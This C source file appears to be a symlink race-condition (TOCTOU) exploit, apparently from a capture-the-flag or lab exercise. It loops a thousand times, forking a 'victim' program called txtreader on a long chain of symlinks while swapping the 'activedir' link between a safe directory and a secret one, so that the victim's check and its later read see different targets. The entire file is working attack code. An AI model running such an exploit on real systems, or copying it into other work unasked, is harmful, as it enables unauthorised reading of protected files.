#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>

int main () {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  for (int i = 1; i < 1000; i++) {
    unlink("activedir");
    symlink("secret_maze/sentry", "activedir");

    // Let the victim run
    pid_t pid = fork();
    if (pid == 0) {
      execl("./txtreader", "txtreader", "activedir/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk", NULL);
      exit(0);
    }
    else if (pid > 0){
      usleep(10*i); // yield CPU
      // Switch where target points
      unlink("activedir");
      symlink("safe_maze/sentry", "activedir");

      waitpid(pid, NULL, 0);
    }
    printf("Process number %d done executing\n", i);
  }
}
